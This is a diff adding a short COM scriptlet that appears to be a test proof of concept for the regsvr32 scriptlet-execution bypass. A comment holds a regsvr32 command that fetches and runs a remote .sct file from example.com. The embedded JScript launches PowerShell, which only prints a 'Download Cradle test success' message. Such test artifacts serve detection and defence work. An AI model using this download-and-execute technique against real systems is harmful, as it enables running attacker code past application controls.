@@ -1,0 +1,14 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+	<!-- regsvr32 /s /u /i:http://example.com/file.sct scrobj.dll -->
+	<script language="JScript">
+		<![CDATA[
+			var r = new ActiveXObject("WScript.Shell").Run("powershell -c \"write-host -ForegroundColor Cyan $(Get-Date -Format s) 'Download Cradle test success!';Read-Host -Prompt 'Press Enter to continue'\"");	
+	
+		]]>
+</script>
+</registration>
+</scriptlet>
